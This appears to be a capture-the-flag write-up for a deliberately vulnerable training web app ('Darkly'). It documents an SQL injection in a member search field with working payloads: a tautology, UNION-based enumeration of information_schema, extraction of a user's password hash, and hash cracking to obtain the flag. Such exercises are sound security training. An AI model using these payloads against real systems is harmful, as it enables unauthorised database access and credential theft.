# Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

## Description

SQL Injection occurs when a web application constructs an SQL query using user-controlled inputs without properly sanitizing special characters. Attackers can manipulate the SQL syntax to execute arbitrary commands, retrieve sensitive information, or modify the database.

### Evidence of Vulnerability

In the `Darkly` application, the search bar on the `membre` page is vulnerable to SQL injection. Entering `'` in the search bar results in an SQL error, revealing the vulnerability. 

The query appears to retrieve a user's first and last name based on their ID:
```sql
SELECT first_name, surname FROM users WHERE user_id = 1
```

By injecting 1` OR 1=1 --`, attackers can retrieve all user records:
```sql
SELECT first_name, surname FROM users WHERE user_id = 1 OR 1=1 --
```
This reveals all users, including one named Flag with the last name GetThe. Further exploration using SQL injection techniques, such as UNION attacks, allows enumeration of the database schema and the extraction of sensitive information.

### Exploitation Steps

1. Identify Vulnerable Endpoint:
- Input `'` in the search bar to confirm the SQL injection vulnerability.

2. Dump All Users:
- Inject `1 OR 1=1 --` to retrieve all users.

3. Perform UNION Attack:
- Determine the number of columns:
```sql
1 UNION SELECT NULL,NULL--
```
- Enumerate database tables:
```sql
1 UNION SELECT table_name,NULL FROM information_schema.tables--
```
- Enumerate columns in the users table:
```sql
1 UNION SELECT COLUMN_NAME,NULL FROM information_schema.columns WHERE table_name = 0x7573657273
```
- Retrieve sensitive columns for the Flag user:
```sql
1 UNION SELECT Commentaire,countersign FROM users WHERE first_name = 0x466c6167 --
```
4. Crack the Hash:
- Use CrackStation to decode the MD5 hash in the countersign column.
- Hash the resulting string (fortytwo) with SHA-256 to retrieve the flag:
```bash
echo -n "fortytwo" | sha256sum
```